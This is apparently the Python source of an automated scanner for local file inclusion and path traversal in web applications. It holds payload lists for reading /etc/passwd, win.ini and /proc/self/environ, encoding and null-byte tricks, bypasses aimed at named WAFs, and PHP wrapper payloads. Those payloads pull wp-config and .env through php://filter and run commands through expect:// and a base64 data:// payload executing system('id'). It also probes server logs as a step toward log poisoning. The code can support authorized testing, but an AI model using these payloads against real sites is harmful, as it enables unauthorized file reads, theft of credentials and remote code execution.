"""
LFI Scanner v1.0 — Local File Inclusion / Path Traversal Detection

Features:
1. Classic path traversal (../../../etc/passwd)
2. PHP filter wrapper (php://filter/convert.base64-encode/resource=)
3. PHP expect wrapper (expect://id)
4. PHP data wrapper (data://text/plain;base64,)
5. Null byte injection (%00)
6. Double encoding (%252e%252e%252f)
7. Unicode/UTF-8 bypasses
8. WAF bypass techniques (path normalization, encoding tricks)
9. OS detection (Linux vs Windows targets)
10. Log poisoning detection
11. Smart param prioritization (file, path, page, template, include)

Integrates with: WAFDetector, RecursiveCrawler, SecretExtractor
"""

import re
import asyncio
import aiohttp
import random
import base64
from typing import Dict, List, Optional, Tuple, Set
from dataclasses import dataclass, field
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from loguru import logger


# ──────────────────────────────────────────────────────────────────
# Data classes
# ──────────────────────────────────────────────────────────────────

@dataclass
class LFIResult:
    """Result of LFI/path traversal testing."""
    url: str
    parameter: str
    vulnerable: bool = False
    lfi_type: str = ""           # traversal, php_filter, php_expect, php_data, null_byte, log_poison
    payload_used: str = ""
    evidence: str = ""           # Content excerpt from included file
    file_read: str = ""          # File path that was successfully read
    os_detected: str = ""        # linux, windows
    confidence: float = 0.0
    injection_point: str = "url" # url, post, cookie
    severity: str = "high"


# ──────────────────────────────────────────────────────────────────
# File indicators — known content in target files
# ──────────────────────────────────────────────────────────────────

# Linux file indicators
LINUX_FILE_CHECKS = {
    "/etc/passwd": [
        re.compile(r'root:.*:0:0:', re.M),
        re.compile(r'bin:/usr/sbin/nologin', re.M),
        re.compile(r'www-data:', re.M),
        re.compile(r'nobody:.*:65534:', re.M),
    ],
    "/etc/hosts": [
        re.compile(r'127\.0\.0\.1\s+localhost', re.M),
        re.compile(r'::1\s+localhost', re.M),
    ],
    "/proc/self/environ": [
        re.compile(r'PATH=', re.M),
        re.compile(r'HOME=/', re.M),
        re.compile(r'SERVER_SOFTWARE=', re.M),
    ],
    "/proc/version": [
        re.compile(r'Linux version \d+\.\d+', re.M),
    ],
    "/etc/os-release": [
        re.compile(r'NAME="?(?:Ubuntu|Debian|CentOS|Fedora|Alpine)', re.I | re.M),
        re.compile(r'VERSION_ID=', re.M),
    ],
}

# Windows file indicators
WINDOWS_FILE_CHECKS = {
    "C:\\Windows\\win.ini": [
        re.compile(r'\[fonts\]', re.M | re.I),
        re.compile(r'\[extensions\]', re.M | re.I),
        re.compile(r'\[mci extensions\]', re.M | re.I),
    ],
    "C:\\Windows\\System32\\drivers\\etc\\hosts": [
        re.compile(r'127\.0\.0\.1\s+localhost', re.M),
    ],
    "C:\\boot.ini": [
        re.compile(r'\[boot loader\]', re.M | re.I),
        re.compile(r'multi\(0\)', re.M | re.I),
    ],
}


# ──────────────────────────────────────────────────────────────────
# Payload databases
# ──────────────────────────────────────────────────────────────────

# Classic traversal payloads (Linux)
LINUX_TRAVERSAL = [
    ("../../../etc/passwd", "/etc/passwd"),
    ("../../../../etc/passwd", "/etc/passwd"),
    ("../../../../../etc/passwd", "/etc/passwd"),
    ("../../../../../../etc/passwd", "/etc/passwd"),
    ("../../../../../../../etc/passwd", "/etc/passwd"),
    ("../../../etc/hosts", "/etc/hosts"),
    ("../../../proc/self/environ", "/proc/self/environ"),
    ("../../../proc/version", "/proc/version"),
]

# Classic traversal payloads (Windows)
WINDOWS_TRAVERSAL = [
    ("..\\..\\..\\Windows\\win.ini", "C:\\Windows\\win.ini"),
    ("..\\..\\..\\..\\Windows\\win.ini", "C:\\Windows\\win.ini"),
    ("..\\..\\..\\..\\..\\Windows\\win.ini", "C:\\Windows\\win.ini"),
    ("../../../Windows/win.ini", "C:\\Windows\\win.ini"),
    ("../../../../Windows/win.ini", "C:\\Windows\\win.ini"),
]

# Encoding bypass payloads
ENCODING_BYPASSES = [
    # Double URL encoding
    ("..%252f..%252f..%252fetc%252fpasswd", "/etc/passwd"),
    ("..%252f..%252f..%252f..%252fetc%252fpasswd", "/etc/passwd"),
    # URL encoding
    ("..%2f..%2f..%2fetc%2fpasswd", "/etc/passwd"),
    ("..%2f..%2f..%2f..%2fetc%2fpasswd", "/etc/passwd"),
    # Unicode / UTF-8
    ("..%c0%af..%c0%af..%c0%afetc/passwd", "/etc/passwd"),
    ("..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd", "/etc/passwd"),
    ("%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", "/etc/passwd"),
    # Backslash
    ("..\\..\\..\\etc\\passwd", "/etc/passwd"),
    # Dot stripping bypass
    ("....//....//....//etc/passwd", "/etc/passwd"),
    ("....\\\\....\\\\....\\\\etc\\passwd", "/etc/passwd"),
    # Null byte (for PHP < 5.3.4)
    ("../../../etc/passwd%00", "/etc/passwd"),
    ("../../../etc/passwd\x00.php", "/etc/passwd"),
    ("../../../etc/passwd%00.jpg", "/etc/passwd"),
    # Path truncation
    ("../../../etc/passwd" + "/./" * 100, "/etc/passwd"),
]

# PHP wrapper payloads
PHP_WRAPPER_PAYLOADS = [
    # php://filter — read source code as base64
    ("php://filter/convert.base64-encode/resource=index", "php_filter", "index.php"),
    ("php://filter/convert.base64-encode/resource=config", "php_filter", "config.php"),
    ("php://filter/convert.base64-encode/resource=../config", "php_filter", "config.php"),
    ("php://filter/convert.base64-encode/resource=../wp-config", "php_filter", "wp-config.php"),
    ("php://filter/convert.base64-encode/resource=../includes/config", "php_filter", "config.php"),
    ("php://filter/convert.base64-encode/resource=.env", "php_filter", ".env"),
    ("php://filter/read=convert.base64-encode/resource=/etc/passwd", "php_filter", "/etc/passwd"),
    # php://input — requires POST body
    ("php://input", "php_input", None),
    # php://expect — command execution
    ("expect://id", "php_expect", None),
    ("expect://whoami", "php_expect", None),
    # data:// — code execution
    ("data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==", "php_data", None),  # <?php system('id'); ?>
    ("data://text/plain,<?php echo 'LFI_CONFIRMED'; ?>", "php_data", None),
]

# WAF-specific bypass payloads
WAF_BYPASS_LFI = {
    "cloudflare": [
        ("..././..././..././etc/passwd", "/etc/passwd"),
        ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "/etc/passwd"),
        ("....//....//....//etc/passwd", "/etc/passwd"),
    ],
    "modsecurity": [
        ("/etc/./passwd", "/etc/passwd"),
        ("..;/..;/..;/etc/passwd", "/etc/passwd"),
        ("..%00/..%00/..%00/etc/passwd", "/etc/passwd"),
    ],
    "apache": [
        ("/etc/passwd%00.html", "/etc/passwd"),
        ("/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "/etc/passwd"),
    ],
    "nginx": [
        ("..;/..;/..;/etc/passwd", "/etc/passwd"),
        ("/var/www/../../../etc/passwd", "/etc/passwd"),
    ],
}

# Log files for log poisoning
LOG_FILES = [
    "/var/log/apache2/access.log",
    "/var/log/apache/access.log",
    "/var/log/httpd/access_log",
    "/var/log/nginx/access.log",
    "/var/log/auth.log",
    "/var/log/syslog",
    "/proc/self/fd/0",
    "/proc/self/fd/1",
    "/proc/self/fd/2",
    "/var/log/vsftpd.log",
    "/var/log/mail.log",
    "/tmp/sess_" + "a" * 26,  # PHP session file
]

# ──────────────────────────────────────────────────────────────────
# Extended LFI paths from wordlist (params/lfi_paths.txt)
# ──────────────────────────────────────────────────────────────────

def _load_lfi_wordlist() -> List[str]:
    """Load extended LFI paths from params/lfi_paths.txt."""
    import os
    wordlist_path = os.path.join(os.path.dirname(__file__), "params", "lfi_paths.txt")
    paths = []
    try:
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    paths.append(line)
    except FileNotFoundError:
        logger.debug(f"[LFI] Wordlist not found: {wordlist_path}")
    return paths

# Direct file inclusion payloads — absolute paths for systems allowing direct file read
# Each entry is (payload_path, target_file_for_validation)
DIRECT_FILE_PAYLOADS: List[Tuple[str, str]] = []
_extended_paths = _load_lfi_wordlist()
for _p in _extended_paths:
    _p_stripped = _p.lstrip('/')
    # Determine which validation checks to use
    if '/etc/passwd' in _p:
        DIRECT_FILE_PAYLOADS.append((_p, '/etc/passwd'))
    elif '/etc/shadow' in _p:
        DIRECT_FILE_PAYLOADS.append((_p, '/etc/passwd'))  # shadow format similar
    elif '/win.ini' in _p.lower() or '/boot.ini' in _p.lower():
        DIRECT_FILE_PAYLOADS.append((_p, 'C:\\Windows\\win.ini'))
    elif '/etc/hosts' in _p:
        DIRECT_FILE_PAYLOADS.append((_p, '/etc/hosts'))
    elif '/proc/' in _p:
        DIRECT_FILE_PAYLOADS.append((_p, '/proc/self/environ'))
    elif 'access' in _p.lower() and 'log' in _p.lower():
        DIRECT_FILE_PAYLOADS.append((_p, '/etc/hosts'))  # generic — just check for valid content
    elif 'error' in _p.lower() and 'log' in _p.lower():
        DIRECT_FILE_PAYLOADS.append((_p, '/etc/hosts'))
    else:
        # Generic file — check if response contains common file content signatures
        DIRECT_FILE_PAYLOADS.append((_p, '/etc/passwd'))

# Also generate traversal variants for each wordlist path (../../../ + path)
TRAVERSAL_WORDLIST_PAYLOADS: List[Tuple[str, str]] = []
for _p, _check in DIRECT_FILE_PAYLOADS[:50]:  # Limit to top 50 for traversal generation
    clean = _p.lstrip('/')
    for depth in range(3, 8):
        prefix = '../' * depth
        TRAVERSAL_WORDLIST_PAYLOADS.append((f"{prefix}{clean}", _check))


# ──────────────────────────────────────────────────────────────────
# LFI Scanner
# ──────────────────────────────────────────────────────────────────

class LFIScanner:
    """Local File Inclusion / Path Traversal detection engine."""

    def __init__(self, config=None):
        self.config = config
        self.timeout = 15
        self.max_params = 8
        self._semaphore = asyncio.Semaphore(3)

    # ──────────────────────────────────────────────────────────
    # Main entry point
    # ──────────────────────────────────────────────────────────

    async def scan(
        self,
        url: str,
        session: aiohttp.ClientSession,
        waf_name: str = None,
        os_hint: str = None,
    ) -> List[LFIResult]:
        """
        Full LFI/path traversal scan.
        
        1. Extract parameters (prioritize file/path/page/template params)
        2. Test Linux traversal payloads
        3. Test Windows traversal payloads
        4. Test encoding bypasses
        5. Test PHP wrappers (filter, expect, data)
        6. Test WAF-specific bypasses
        7. Test log poisoning
        
        Args:
            url: Target URL with parameters
            session: aiohttp session
            waf_name: Detected WAF for bypass payloads
            os_hint: OS hint for targeted payloads (linux/windows)
            
        Returns:
            List of LFIResult
        """
        results = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        if not params:
            return results

        param_names = self._prioritize_params(list(params.keys()))[:self.max_params]
        logger.info(f"[LFI] Testing {len(param_names)} params on {url[:60]}")

        # Get baseline response for comparison
        try:
            async with session.get(url, ssl=False,
                                  timeout=aiohttp.ClientTimeout(total=self.timeout)) as resp:
                baseline = await resp.text(errors='replace')
                baseline_len = len(baseline)
        except Exception:
            return results

        for pname in param_names:
            async with self._semaphore:
                result = await self._test_param(
                    url, pname, params, session, baseline, baseline_len,
                    waf_name, os_hint,
                )
                if result:
                    results.extend(result)
                    logger.info(f"[LFI] VULNERABLE: {pname} on {url[:50]}")

        if results:
            logger.info(f"[LFI] Found {len(results)} LFI/traversal issues on {url[:60]}")

        return results

    def _prioritize_params(self, params: List[str]) -> List[str]:
        """Sort params by LFI likelihood."""
        HIGH = {
            'file', 'path', 'page', 'template', 'tpl', 'include', 'inc',
            'require', 'dir', 'folder', 'doc', 'document', 'root',
            'pg', 'view', 'content', 'filename', 'filepath', 'name',
            'load', 'read', 'retrieve', 'fetch', 'cat', 'source',
            'src', 'layout', 'theme', 'style', 'lang', 'language',
            'locate', 'show', 'display', 'open', 'access',
        }
        MEDIUM = {
            'id', 'url', 'uri', 'ref', 'redirect', 'return', 'next',
            'action', 'cmd', 'module', 'plugin', 'ext', 'type', 'site',
        }

        def score(p):
            pl = p.lower()
            if pl in HIGH:
                return 0
            if pl in MEDIUM:
                return 1
            return 2

        return sorted(params, key=score)

    # ──────────────────────────────────────────────────────────
    # Per-parameter testing
    # ──────────────────────────────────────────────────────────

    async def _test_param(
        self, url: str, param: str, params: Dict,
        session: aiohttp.ClientSession, baseline: str, baseline_len: int,
        waf_name: str = None, os_hint: str = None,
    ) -> List[LFIResult]:
        """Test a single parameter for LFI."""
        results = []

        # Phase 1: Classic traversal
        traversal_payloads = LINUX_TRAVERSAL.copy()
        if os_hint != "linux":
            traversal_payloads.extend(WINDOWS_TRAVERSAL)

        for payload, target_file in traversal_payloads:
            result = await self._test_payload(
                url, param, params, payload, target_file,
                "traversal", session, baseline_len,
            )
            if result:
                results.append(result)
                # Determine OS from first hit
                if not os_hint:
                    os_hint = "linux" if "/etc/" in target_file else "windows"
                break  # Found traversal, move to wrappers

        # Phase 2: Encoding bypasses (if no result yet or WAF detected)
        if not results or waf_name:
            for payload, target_file in ENCODING_BYPASSES:
                result = await self._test_payload(
                    url, param, params, payload, target_file,
                    "traversal", session, baseline_len,
                )
                if result:
                    results.append(result)
                    break
                await asyncio.sleep(random.uniform(0.05, 0.1))

        # Phase 3: WAF-specific bypasses
        if waf_name and not results:
            waf_key = waf_name.lower().replace(' ', '_')
            for key, payloads in WAF_BYPASS_LFI.items():
                if key in waf_key:
                    for payload, target_file in payloads:
                        result = await self._test_payload(
                            url, param, params, payload, target_file,
                            "traversal", session, baseline_len,
                        )
                        if result:
                            result.waf_bypassed = waf_name
                            results.append(result)
                            break

        # Phase 3.5: Extended wordlist traversal paths (207 paths from dic_file_dump.txt)
        if not results and TRAVERSAL_WORDLIST_PAYLOADS:
            for payload, target_file in TRAVERSAL_WORDLIST_PAYLOADS[:80]:  # Sample 80 variants
                result = await self._test_payload(
                    url, param, params, payload, target_file,
                    "traversal", session, baseline_len,
                )
                if result:
                    results.append(result)
                    logger.info(f"[LFI] Wordlist hit: {payload}")
                    break
                await asyncio.sleep(random.uniform(0.02, 0.06))

        # Phase 3.6: Direct absolute file paths (for apps that read absolute paths directly)
        if not results and DIRECT_FILE_PAYLOADS:
            for payload, target_file in DIRECT_FILE_PAYLOADS[:30]:  # Top 30 most interesting
                result = await self._test_payload(
                    url, param, params, payload, target_file,
                    "traversal", session, baseline_len,
                )
                if result:
                    results.append(result)
                    logger.info(f"[LFI] Direct path hit: {payload}")
                    break
                await asyncio.sleep(random.uniform(0.02, 0.06))

        # Phase 4: PHP wrappers
        php_indicators = any(x in url.lower() for x in ['.php', 'php', 'index'])
        if php_indicators or not results:
            for payload, wrapper_type, target in PHP_WRAPPER_PAYLOADS[:6]:
                result = await self._test_php_wrapper(
                    url, param, params, payload, wrapper_type, target, session,
                )
                if result:
                    results.append(result)
                    break
                await asyncio.sleep(random.uniform(0.05, 0.1))

        # Phase 5: Log poisoning check
        if results and any(r.lfi_type == "traversal" for r in results):
            log_result = await self._check_log_poisoning(
                url, param, params, session, baseline_len,
            )
            if log_result:
                results.append(log_result)

        return results

    async def _test_payload(
        self, url: str, param: str, params: Dict,
        payload: str, target_file: str, lfi_type: str,
        session: aiohttp.ClientSession, baseline_len: int,
    ) -> Optional[LFIResult]:
        """Test a single LFI payload."""
        try:
            test_url = self._inject_param(url, param, params, payload)
            async with session.get(test_url, ssl=False,
                                  timeout=aiohttp.ClientTimeout(total=self.timeout),
                                  allow_redirects=True) as resp:
                body = await resp.text(errors='replace')
                status = resp.status

            if status >= 400:
                return None

            # Check for file content indicators
            os_detected = ""
            evidence = ""

            # Check Linux files
            for check_file, patterns in LINUX_FILE_CHECKS.items():
                if check_file == target_file or target_file == "/etc/passwd":
                    for pattern in patterns:
                        match = pattern.search(body)
                        if match:
                            os_detected = "linux"
                            evidence = match.group()[:100]
                            return LFIResult(
                                url=url,
                                parameter=param,
                                vulnerable=True,
                                lfi_type=lfi_type,
                                payload_used=payload,
                                evidence=evidence,
                                file_read=target_file,
                                os_detected="linux",
                                confidence=0.95,
                                severity="critical" if "/etc/passwd" in target_file else "high",
                            )

            # Check Windows files
            for check_file, patterns in WINDOWS_FILE_CHECKS.items():
                for pattern in patterns:
                    match = pattern.search(body)
                    if match:
                        return LFIResult(
                            url=url,
                            parameter=param,
                            vulnerable=True,
                            lfi_type=lfi_type,
                            payload_used=payload,
                            evidence=match.group()[:100],
                            file_read=target_file,
                            os_detected="windows",
                            confidence=0.95,
                            severity="critical",
                        )

            # Generic: response significantly different from baseline
            # and contains file-like content
            if abs(len(body) - baseline_len) > 500:
                # Check for generic file content
                file_indicators = [
                    r'root:.*:0:0:',
                    r'\[fonts\]',
                    r'PATH=',
                    r'Linux version',
                    r'<?php',
                    r'<?xml',
                    r'#!/bin/(bash|sh)',
                ]
                for indicator in file_indicators:
                    if re.search(indicator, body, re.I):
                        return LFIResult(
                            url=url,
                            parameter=param,
                            vulnerable=True,
                            lfi_type=lfi_type,
                            payload_used=payload,
                            evidence=f"File content indicator: {indicator}",
                            file_read=target_file,
                            confidence=0.7,
                            severity="high",
                        )

        except Exception as e:
            logger.debug(f"[LFI] Payload test error: {e}")

        return None

    # ──────────────────────────────────────────────────────────
    # PHP wrapper testing
    # ──────────────────────────────────────────────────────────

    async def _test_php_wrapper(
        self, url: str, param: str, params: Dict,
        payload: str, wrapper_type: str, target: Optional[str],
        session: aiohttp.ClientSession,
    ) -> Optional[LFIResult]:
        """Test PHP wrappers (filter, expect, data, input)."""
        try:
            test_url = self._inject_param(url, param, params, payload)
            async with session.get(test_url, ssl=False,
                                  timeout=aiohttp.ClientTimeout(total=self.timeout)) as resp:
                body = await resp.text(errors='replace')
                status = resp.status

            if status >= 400:
                return None

            # php://filter — look for base64 encoded content
            if wrapper_type == "php_filter":
                # Look for base64 blob in response
                b64_match = re.search(r'([A-Za-z0-9+/]{50,}={0,2})', body)
                if b64_match:
                    try:
                        decoded = base64.b64decode(b64_match.group(1)).decode('utf-8', errors='replace')
                        if '<?php' in decoded or '<?=' in decoded or 'function' in decoded:
                            return LFIResult(
                                url=url,
                                parameter=param,
                                vulnerable=True,
                                lfi_type="php_filter",
                                payload_used=payload,
                                evidence=f"PHP source code via filter: {decoded[:150]}",
                                file_read=target or "source",
                                confidence=0.95,
                                severity="critical",
                            )
                    except Exception:
                        pass

            # php://expect — look for command output
            elif wrapper_type == "php_expect":
                rce_indicators = [r'uid=\d+', r'root:', r'www-data', r'nt authority']
                for indicator in rce_indicators:
                    if re.search(indicator, body, re.I):
                        return LFIResult(
                            url=url,
                            parameter=param,
                            vulnerable=True,
                            lfi_type="php_expect",
                            payload_used=payload,
                            evidence=f"RCE via expect://: {body[:150]}",
                            confidence=0.95,
                            severity="critical",
                        )

            # data:// — look for our marker
            elif wrapper_type == "php_data":
                if 'LFI_CONFIRMED' in body:
                    return LFIResult(
                        url=url,
                        parameter=param,
                        vulnerable=True,
                        lfi_type="php_data",
                        payload_used=payload,
                        evidence="data:// wrapper code execution confirmed",
                        confidence=0.95,
                        severity="critical",
                    )
                # Check for command output from base64 payload
                if re.search(r'uid=\d+', body):
                    return LFIResult(
                        url=url,
                        parameter=param,
                        vulnerable=True,
                        lfi_type="php_data",
                        payload_used=payload,
                        evidence=f"RCE via data://: {body[:150]}",
                        confidence=0.95,
                        severity="critical",
                    )

        except Exception as e:
            logger.debug(f"[LFI] PHP wrapper test error: {e}")

        return None

    # ──────────────────────────────────────────────────────────
    # Log poisoning detection
    # ──────────────────────────────────────────────────────────

    async def _check_log_poisoning(
        self, url: str, param: str, params: Dict,
        session: aiohttp.ClientSession, baseline_len: int,
    ) -> Optional[LFIResult]:
        """Check if log files are accessible (prerequisite for log poisoning)."""
        for log_path in LOG_FILES[:5]:
            traversal = "../" * 8 + log_path.lstrip('/')
            try:
                test_url = self._inject_param(url, param, params, traversal)
                async with session.get(test_url, ssl=False,
                                      timeout=aiohttp.ClientTimeout(total=self.timeout)) as resp:
                    body = await resp.text(errors='replace')

                # Log file indicators
                log_indicators = [
                    r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}.*(?:GET|POST|HEAD)',
                    r'\[\d{2}/\w{3}/\d{4}',
                    r'HTTP/\d\.\d',
                    r'Mozilla/\d\.\d',
                ]

                for indicator in log_indicators:
                    if re.search(indicator, body):
                        return LFIResult(
                            url=url,
                            parameter=param,
                            vulnerable=True,
                            lfi_type="log_poison",
                            payload_used=traversal,
                            evidence=f"Log file readable: {log_path}",
                            file_read=log_path,
                            os_detected="linux",
                            confidence=0.85,
                            severity="critical",  # Log poisoning → RCE
                        )

            except Exception:
                continue

        return None

    # ──────────────────────────────────────────────────────────
    # Utility
    # ──────────────────────────────────────────────────────────

    def _inject_param(self, url: str, param: str, params: Dict, value: str) -> str:
        """Build URL with modified parameter value."""
        parsed = urlparse(url)
        new_params = {}
        for k, v in params.items():
            if k == param:
                new_params[k] = value
            else:
                new_params[k] = v[0] if isinstance(v, list) else v
        new_query = urlencode(new_params, doseq=False)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                          parsed.params, new_query, parsed.fragment))
